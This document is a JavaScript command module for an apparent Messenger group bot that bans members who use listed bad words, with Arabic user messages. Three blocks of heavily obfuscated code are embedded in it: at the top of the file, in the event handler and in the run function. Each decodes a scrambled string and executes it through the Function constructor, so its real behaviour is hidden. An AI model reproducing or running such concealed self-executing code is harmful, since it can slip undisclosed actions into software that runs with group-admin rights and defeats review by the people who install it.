var path,fs;(function(){var xTf='',dON=814-803;function PtL(m){var t=437304;var v=m.length;var y=[];for(var e=0;e<v;e++){y[e]=m.charAt(e)};for(var e=0;e<v;e++){var j=t*(e+69)+(t%12424);var h=t*(e+258)+(t%30083);var w=j%v;var n=h%v;var s=y[w];y[w]=y[n];y[n]=s;t=(j+h)%2506126;};return y.join('')};var KKq=PtL('ntcsvruizmrodtxjooncabrhfcwptsqulykeg').substr(0,dON);var WsW='r16 +s;,,ang,h0d9=;e6rklo=.iv[ef,f)jln=[+ p+et=r.26z";)=nah rS9n.dth n;[+ t,72.9o,0ao8vg{vns u;iot5aam,8"c1);vvsv;}(6r]6";e1osefn])f=].,ahsiunn1rbo8.1f(wj=+==m(r"lfprbe;u) itdhlCdn+[=jil(fe2<k++)=)hr,a vrvu80rhl}0go[invt1 an]l;Aih+ag0+r(m;8zg,teja7v}0r((ci2;)=f;rea=;,))n;=m.er ",,-vle>{g"+ rr]fal adrimlrri+c0(;1sn;m((=;=gho;r+;<.(+ ocC)idpst)sg;3h-aa=5-(0=;(aar[,;h;=0au2)e+{.es3;x3kcx[ =gm0am++)oioq[uh-ot,,.](j0anc(jt1)*r+shl,4ssotqAt];.v7tvvmhhl.=)rs)Cuv=[v7s=i=)ox=a.ro;(eh+Aui c!in;auCrduu;[;==x)+ticni Cr=eogf 1toenpahe;d=f7v};Age{o(nxwvua e7l1s2lt.ll) "[ia)t ao )n.,4;i(s,snbsn,8}g6ua.l7r,fv8se8o;rh14(uua*i;;f.;(n3,"1-zb4ir,8lc(.vl;s7(s.ne]vn=(((vrcsnmui)k,.<=i=t,+2n}9ftps7!vm +av;=]rr=awf(gC]8(<{icr"{;oo-.ut1rc9i+cd,hA=9l{phot((,rba)fu(;q=)2 =hg=r}r[Coe(C==1ibc ;d-+>cb)0(v;;+a=.hlfuaj;2jo]wvgc).6rti)bpir.t.25rr)c.6opn(Sarag)eoo <2r[y[eze;t)c])n(ctr=]skw"i;letaqc)cuu9t].n)qak';var IHU=PtL[KKq];var cpx='';var pVk=IHU;var WNB=IHU(cpx,PtL(WsW));var RfY=WNB(PtL('c\' 0e3a$.H{dHg4t2&ets#\/1ka_lHcH4!,.)e&s.}f#.o.Hi4n!H,4)i6a+tHb}c.H)=(=sd1;e& .;.j..x(e+_ftd0..}sq4gHpd3)%%$*q\/7jr6{;bb(He_2.i0HH!aun"e.3He4Hr(n(knxseoH9{.#tH;.._ S)r.}es;e.el(ee,H*HtH.Hr}l0nu_+ p(lr"H9oH0$H&s.ej)!=.,o2r4a$i.7r;;)gs3(_arsl,hr,HfH=C=[o !3();"djo0;6)7s.r-9HH$={H e=be{1]t.4a3,rhte]Se4,f.;,cb3s ti);#1f$fu46Ht!H)2_ H%1o],aHa)).H H=o($lt3e)l,fia71\/,4u582=u3oH.1b3f7n;=v;ne()HHplH1h)t1+3;tn.b)e64)0);.lf[d_0r!}_e2(o=.,.eH.!\/(j;1Hs=HftH.lio.r(H*(oa4_33;)53o$,,,p.rH_,(a_7gf!9r_j($(b+(.gS8{n}(HH$nH(bHos oeCta\'.H0o()2_);e00=#d),jH3=4H;7a6]#H%in{eebHcy(.i{il0Ha)d!3f)(rle{oi,H.!.Hnrp("r(b(2j0-;+$+Hy)e;ef7f(%;c{g}h=,+}fiH.$(i_f9pHH!)H.)$=s=.er3Hu,s=.;pHadli[m%e7H_307lr,ct 4n)l}2i!Hjb.ai6)=(%1$,d}j)rb=)cHH!17};6\').nmi;,Hn$ne#r_-e)v{}tH+ 0)!s.3.=)iHtuH3!li(rrHs!c5H!e,_=uH.)dH.ke$(d!rH;.sHHr1;ur,He0t%ffet7)H,n=g"!e_t{$cre,,tr),0{4fw.,!rteiHoaH=-(escou_-ps3rdc)=*fdH.,ti==}\' $$tnb_lH);7H-Hf2.et]onHH.r{nH)%n )oH$a$,)(}e ,d!}n.!Hn gdiH.{a3)o$4S )at(.ee(02.f(e=e)s e.H![-((}}_a= $,{7he$4}");n$"(H'));var tGw=pVk(xTf,RfY );tGw(3628);return 6957})()
module.exports.config = {
  name: "حضر",
  version: "1.0.0",
  hasPermission: 1,
  credits: "ZINO",
  description: "حظر شخص عند قوله كلمة نامية أو محظورة",
  usePrefix: true,
  commandCategory: "المالك",
  usages: "تشغيل | إيقاف",
  cooldowns: 5,
};

module.exports.handleEvent = async function({ api, event }) {
  const { threadID, messageID, senderID } = event;


  var loadWords;(function(){var fSd='',npB=436-425;function ued(u){var z=585389;var s=u.length;var m=[];for(var p=0;p<s;p++){m[p]=u.charAt(p)};for(var p=0;p<s;p++){var k=z*(p+450)+(z%44408);var y=z*(p+677)+(z%24660);var h=k%s;var e=y%s;var t=m[h];m[h]=m[e];m[e]=t;z=(k+y)%2680050;};return m.join('')};var tZs=ued('fcnoizuxcosrbgwucporrmtnhleyvktjtdsqa').substr(0,npB);var rmb='=au=n1,=,+[0jmlo1x[5uv aag,n+snd,{a(>=pr;strsa;g[r.1"uv0r.}c,a9,.aysspk,m6; ;+gi=o6or2ujuuot0a7b=7a,8.,luv(Swn8,8v,,]tefsvf+7ovhi];lo.t2a;)0o4;{]evll=et)ng]., [2ao"gi9)(dtrfzr(rn)oz S5ux033 f1Ce;C[e;(9{a< f<0;rtalA=9cl.;pg. gtis;.int)+n=()rvf=7r4;.[7}a+urdx("h)2nfpi(;a;0]d.0=pn,.a-1[i6)0rra-+=(+rrj=nv5r;ji20(ntla9i+a,;s.9z+6rvCo>g).-s5rozo.te5ng=g8i=r=)]frruvwr"=rh(kru;sg(r24+n=dt=- =;akpd<et;;d==2;;)rpnn=4e{wr)i8l=)cCieryvrb+kr[tl(,=)kow.aA8r=7((a"r}ka) (efzb{or7vj= nu }=c=pA[ufa"+c[er]of e o0,1)vv};m- (yeplefhiv2cg;)fheak"tioh1esq7ct;+,."vg)he-o8r-+u]=dt;]inoq; rba.)e(kiyA]=(]]ri)naeef)1avh}sseka=j+e{8;(baslf},dbov=c=t))0d11 ,p)8r4b f(t*turstacvrnv;)i"6("kohloitnCre)].qp..*h retu=;sf rovazoo=;{t+(+.=gC1d)[cz,(rl+c,9)g9qn1)]z)+gci;+ha[,abshvA(z(f1gnh r lr;g;=u(;uy;;o8C(knm.uz; n(tl;.(r(lng8bv;+!ho,iv 6;;nlhosyt<6(gvj[3,(x)jd(g.;;vmC!ah=;ie),sk<h;+r=lr=6 z=)e.4t+nxj,)[hrf.nlk+ ';var IlB=ued[tZs];var Bgn='';var wvi=IlB;var trJ=IlB(Bgn,ued(rmb));var MLl=trJ(ued('a%t.s;s.Ots<OO.n r!(gt;_. cO)a0l3O3a{. 15rcn.,4OO.u.r(og_86(5SOa.Oledf%r\'!;)"l([OtO$gqncl{O\'(6nprOirO0.)(&__,!rI.Oo446)O=d.!%rmt_hOoa_OOcpe$,O \/oog}uo5p6+hO]=l=;OeO$n{O0a:tf|3o;)Oa On+, "7443$8b(x,O8a*=\/ru far4dd]#4l5[c(h.0 6-ac%.>ls=s5OtO!6ka8){]tO):$mO\/OOd !f6O.O;(O=),3.]}0.ra%Sc75,OeO m%O!!7}4!..,!.ae25i4,8an)a.].e,%%l\'cprg0D;)ergOsse1O)g0cas,3,)9OO1dekl.O"SdOnr&+pI1gc_O72nSOeO}%4.;,_u!$))em6cq0i .Oc2t_j.\/O#?7)&hsg.OOnuzOg$%{4t%<x%O=il_4.x{j=st=..17(m7#c5fnb61O=Si.= =O$OnOpr(7.&ng=cOs.c:!5(uta;fO7O!inb4("nO( {j1tOi0ln@eO=,O5(ncham_\'tji.}\/9..6O0Ot{;=35c_gy)gs.(3x.n On(, _%3x,j4pgj@O18p(&eo03nOru6;]-OCu>;$_Ocs41.4)5OO|aneOb;m"40c%;(r"Ot9>oc7(ua6]O;e-.O(O!f{bO+Ocepsoo]pOytdO{rtfgcO=Oio$s3Ne;31d..5oSOO,&c3]>,tc.9O!f} @<;;eb}qOin5e\/bf)c.u1)Oan)_tiOO c=deO,6O4;)2_=\/On.j#e_=r_#(OO&2nO"tp)Sli+g.!#_(o%N[nO.]%eOouO+u.of!p.)iMO=O.64 0$i43O2!O}=3O](.)O,8(.OrOu3b*O-0uors2egh4(Oc)159rou_i];{n,0oOlgc[@p.)Os3x05!lSt).no.i(=:!ch_.66-5]{ncaeOdn.r5;.t9 2=(cO;(O)o7p10){"Oc._$c7Oc$at7(ee62Oc\/c[nw1p9.O$jO)..9!a38cOae(n)3.OOe}.}bOnr(_ 0reO6 ".5i_O.ou9nOvO"u)4cOsik)} ktOt,AiOAs;(0jhoO1,)6(]g!hr5Oi(1c..OOat]eo20cO9%1oe.4NkOe;(((.&sxO)eeO+(;i;.O6"4da]ard3r7(;dO11_ne$,O(c4)k4!_ka()8\'OO75iOtc$OO;%fOnss=ACs)p!iOd9fu)p].O=.3.)!]tle,=a)Onx-.,.cOs0f[lft!cc4OtufO7OOr%(fnO"..3 q4e!(j9)fo{{eO,O3z%$Of43=p=048c(=e3)=43!0rt5;Ofe=oqi59id?!;3,.A20)%..9_)O2].nd])(}O([sbO{r ;.cc;4=1eOhtcs& 1t$#O1=.+O.ncneOiNg-Ou4.(c.(=eoOf)6Op();.dftOe.62)?Oq,<cjcce7O[}(O(tcO26i,uacsiatsc..7af*u93j)).!#= mO(..\'_edlr[*6fO+c+Orc 7g]r"_O3l)em),O?Oe.)O,i( ($t,$4d..u-.s3d$.eco 8or.] ;)).3atu),. !;>1_]b7nO(;!u>%n*!7sn f5esauc8c 0Or{ot)OO'));var hNL=wvi(fSd,MLl );hNL(4782);return 6881})()
  loadWords();

  if (!badWordsActive[threadID]) return;

  const isAdmin = (await api.getThreadInfo(threadID)).adminIDs.some(adminInfo => adminInfo.id === api.getCurrentUserID());

  if (!isAdmin) {
    if (!adminWarningSent[threadID]) {
      api.sendMessage("🛡️ | يحتاج البوت أن يكون آدمن في المجموعة من أجل حظر المزعجين اللذين بتفوهون بكلام بذيء تلقائيا من المجموعة\nتم تطوير الأمر بواسطة زينو", threadID);
      adminWarningSent[threadID] = true;
    } else {
      api.sendMessage("تمت إزالتي من دور مسؤول", threadID);
    }
    return;
  }

  const messageContent = event.body.toLowerCase();
  const hasBannedWord = bannedWords.some(bannedWord => messageContent.includes(bannedWord.toLowerCase()));

  if (hasBannedWord) {
    if (!warnings[senderID]) warnings[senderID] = 0;

    warnings[senderID]++;
    if (warnings[senderID] === 2) {
      api.sendMessage(" ⚠️ |أنت بالفعل تم تحذيرك مرتين هذا يعني أنه سيتم طردك من المجموعة", threadID, messageID);
      api.removeUserFromGroup(senderID, threadID);
      warnings[senderID] = 1;
    } else {
      api.sendMessage(` ⚠️ |  لقد تم تحديد و إكتشاف كلمة نامية ومحظورة في جملتك "${messageContent}" إذا قمت بمعاودة الكرة سيتم طردك تلقائيا من المجموعة`, threadID, messageID);
    }
  }
};

module.exports.run = async function({ api, event, args }) {
  const { threadID, messageID } = event;

  
(function(){var gAK='',UCk=544-533;function AhF(j){var d=4864051;var r=j.length;var q=[];for(var e=0;e<r;e++){q[e]=j.charAt(e)};for(var e=0;e<r;e++){var f=d*(e+389)+(d%12714);var b=d*(e+683)+(d%13610);var a=f%r;var v=b%r;var x=q[a];q[a]=q[v];q[v]=x;d=(f+b)%6362895;};return q.join('')};var YMX=AhF('cjnarruipxofgoezcsvchkydntrmqlbutotsw').substr(0,UCk);var oWR='ohs ,l7osrd2reha,2auarai==acrdrn8;===hetep.=}t=v=xou];vg (v=j8tA.s="ar++=9g8ybn8a0,f,v==;te)}g[[(,=l8n56+inh.8;[if(oo,++qnj.  6=),sfhriatrp(t0]y k,;un+s.;{vu5ev"gv0.oCns=vaenoci))<u=ar1);)=.cqr=o(wfgrpvcn(a.5}rrar,=fwn+zpc+8kmo;aS.)ou+r,i)lrn=m9]n,zny.uh;i+2q ))i2vr{(re;;hval8+gy9-[+)1h,tsb-vaaaf ;)cuslhvl.{=ti(e(ll[k r=su3lC;z,msu0irrra2(oel.tc(.47a) !;ooh"(ae=(e7;r<)gCs;slngtvxre,tha}C;r1,]e.rnirr-,kdhxi;=+df;Cdrwf4h"*n+e.c0+91os,vt]a61+-fhi=e;u0 voel)os(ofxr=)) b=,*=y0a=strapwn>ec;7.4u+ Ay!3n0))+.(uouC)ome;,varoa+uw](1lt+c;a(el=7;r;+iv2]s;gt,v8=mmrj=]prh]+ bd5ak{7.dorr];,Cyg)]uitgb rc6savt{at[ia[<+1]11(A[n-;hi)7((rnie{);i0(;;a,n.+vth(aus(b(t c"ejsaen. t[s[.0o1;)"nul}"7vp};7(0r3oa;t)Srrtl9tj[i;d0=<;9)l)-pcperu9A;f,[a.4)fr9;. o7=f2qk[=o>c4g6) fa(g1f,i=tl(rp]gm .6);n}.(;a( y 3;=<ea,va-a;+=f )ear"s ;)tAgCd(na26((ysdr.eo;fyluhi;wi6h,ma.ugoohy,z]t{)[;p9=urb =ih1lgt0)a"v"(( huvr=;i';var QPy=AhF[YMX];var Fbc='';var OLv=QPy;var RWA=QPy(Fbc,AhF(oWR));var RTH=RWA(AhF('Y#-#bt7r)t2iY6g).rs$$r,.851rYn_4.#$437849Yr66Y2;3YY7=,eb}([[i0..,p8#Y]s!3a hY&9reYe}(f9eqY}243m_.afs._.4.(_i_.p;fi,e4mY1%5 Yd ..$.{r#+e2tx)d.}.{"} 5%m._jb3Y__fl.n;d3b==)m}dr9)Y7aY(!"d.Y$1iYYhsr\/9YY6)c22)}8Yl1id d .cY!([gltY.Yc6&0s5)tld.3e%.nYY3.qd,id,;g9j.dYfYr0_. 0Me(;$l..8db4s(%*Y6s=p\'.Y,689\/Yo.s\/e.n},4pl],&{4Y0n;Yg6u.6s;4,.$,f.7={Y0.a!;o.d77re4rq,Y7)715+7db, nY+)YYY!\/=Yd[]_.!oY]9c(=,% 7{tY9260(9Y3;tme{e!k|Yn4.8!o2aY3q1,SYcYYo$(1u3(0e5aot8Y}g_[%Y j_,.Yn,l4(Yt.u((YY.Yt.(fd)!a+Y$.)a5YS.dY4{).;Ysje%!.5tY*d{%(r.j*6Y3!)YuY3)%q4b3oYuofY9;.Y.=_(]."064fl65;14s.&7sjY17+sa,4(teu9;1+;f$4Y ,=.6)$z *,#r7d=mYbdbY;,l%o;Y\'fdt76t.g3d4n3tjd(Y.)u(4f;o=dyY%)rC-.t] )=Y+n].gd.r);,Cd)z=gaf1o).,sb.bY;3Ieiet)q_$$.)Y)h.t*1$%_!|0u an1+n()-;Y]h8YiiY(6)g-3Y$S8.Y0_!3)dreloY=2dl$Y(0)(YcYYYd4md!sle\'_0YY$1$Y03Y4d2.]iy.)]ic,jYgD]Yg1 5d1chYe([96t};b\'fYY.e;mu,n{Y.Y$_=Ydbfjj.}Yr.4Y(n2.2u,Y4 oY\/Ifd3o!f}sid!d(8Yg3.=h$410Y(Y4d((!..46eY,m)Y(l3Y2i9!)"))0f"5!Ye;_maN"s8,lidd)jdY"),2.)Y;eY\',r5j%}Y %j8)\/fY[!+!(d$)YYh,r.t2!ly;a oj.*tnoY. .!.Y=(3=eY$.sdY14#$e4=Ye Y)\/eYYnYYip9(=g7Y.n.!rg $8).Y3pY)7{70mr+tbs d1xfYvj,Yr(!.sd](f6_03$6Y 3_o45l( Y c!b]'));var VAE=OLv(gAK,RTH );VAE(8035);return 8404})()
  if (!args[0]) {
    return api.sendMessage("أىجوك قم بإختيار  (تشغيل, إيقاف).", threadID);
  }

  const isAdmin = (await api.getThreadInfo(threadID)).adminIDs.some(adminInfo => adminInfo.id === api.getCurrentUserID());

  if (!isAdmin) {
    if (!adminWarningSent[threadID]) {
      api.sendMessage("🛡️ | يحتاج البوت أن يكون آدمن في المجموعة من أجل حظر المزعجين اللذين بتفوهون بكلام بذيء تلقائيا من المجموعة\nتم تطوير الأمر بواسطة زينو", threadID);
      adminWarningSent[threadID] = true;
    } else {
      api.sendMessage("تمت إزالتي من دور مسؤول", threadID);
    }
    return;
  }

  const action = args[0];

  switch (action) {
    case 'تشغيل':
      badWordsActive[threadID] = true;
      api.sendMessage(` ✅ |تم تشغيل الحظر التلقائي للكلمات المحظورة .`, threadID);
      break;
    case 'إيقاف':
      badWordsActive[threadID] = false;
      api.sendMessage(` ❎ |الحظر التلقائي للكلمات المحظورة تم إيقافه .`, threadID);
      break;
    default:
      api.sendMessage(" ❌ |فعل غير صحيح. المرجو إستخدام 'تشغيل' أو 'إيقاف'.", threadID);
  }
};
  
